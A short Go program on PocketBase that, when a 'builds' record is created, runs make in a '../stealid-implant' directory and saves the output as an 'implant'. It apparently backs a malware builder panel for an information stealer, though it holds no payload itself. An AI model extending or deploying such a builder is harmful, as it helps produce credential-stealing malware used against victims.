package main

import (
	"log"

	"os/exec"

	"github.com/pocketbase/pocketbase"
	"github.com/pocketbase/pocketbase/core"
)

func main() {
	app := pocketbase.New()

	app.OnRecordAfterCreateRequest().Add(func(e *core.RecordCreateEvent) error {
		if e.Record.Collection().Name == "builds" {
			e.Record.Set("status", "building")
			app.Dao().SaveRecord(e.Record)
			go createBuild(app, e.Record.GetId())
		}
		return nil
	})

	if err := app.Start(); err != nil {
		log.Fatal(err)
	}
}

func createBuild(app *pocketbase.PocketBase, buildID string) {
	record, _ := app.Dao().FindRecordById("builds", buildID)

	cmd := exec.Command("make", "-C", "../stealid-implant", "main")
	out, err := cmd.Output()

	if err != nil {
		log.Println(err)
		// return c.String(http.StatusOK, "error")
	}
	log.Println(string(out))

	// TODO: read file bytes and set out

	record.Set("implant", out)
	record.Set("status", "success")

	app.Dao().SaveRecord(record)
	// return c.FileFS("sdfsdfsdgfd.exe", os.DirFS("../stealid-implant"))
}
